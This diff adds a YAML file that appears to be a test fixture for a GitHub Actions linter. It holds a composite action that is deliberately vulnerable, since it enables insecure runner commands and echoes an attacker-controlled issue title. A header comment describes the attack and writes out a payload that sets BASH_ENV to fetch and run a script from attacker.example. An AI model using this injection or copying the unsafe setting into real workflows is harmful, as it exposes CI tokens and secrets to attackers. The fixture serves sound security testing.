@@ -1,0 +1,28 @@
+# situation: a composite action with no caller among the files that the
+#   linter reads; a step sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true in the
+#   env of the step and prints the title of an issue; a step comes after.
+# reason: with no caller among the files that the linter reads, the rule
+#   reads the action on every event an attacker triggers, issues among the
+#   events. The runner reads ##[set-env name=NAME;] anywhere in a printed line
+#   as a command where the flag is true, and the title is the attacker's; a
+#   set-env of BASH_ENV runs the attacker's code in the bash of the next step
+#   (GHSA-mfwh-5m23-j46w: "Workflows that log untrusted data to stdout may
+#   invoke these commands").
+# attack: the attacker opens an issue titled ##[set-env
+#   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
+# attack-run-behavior: the step prints the title, the runner sets BASH_ENV,
+#   and the bash of the next step runs the attacker's script with the token
+#   and the secrets of the job.
+name: print title
+description: print the title of the issue
+runs:
+  using: composite
+  steps:
+    - env:
+        ACTIONS_ALLOW_UNSECURE_COMMANDS: true
+        TITLE: ${{ github.event.issue.title }}
+      run: |
+        echo "issue: $TITLE"
+      shell: bash
+    - run: echo next
+      shell: bash
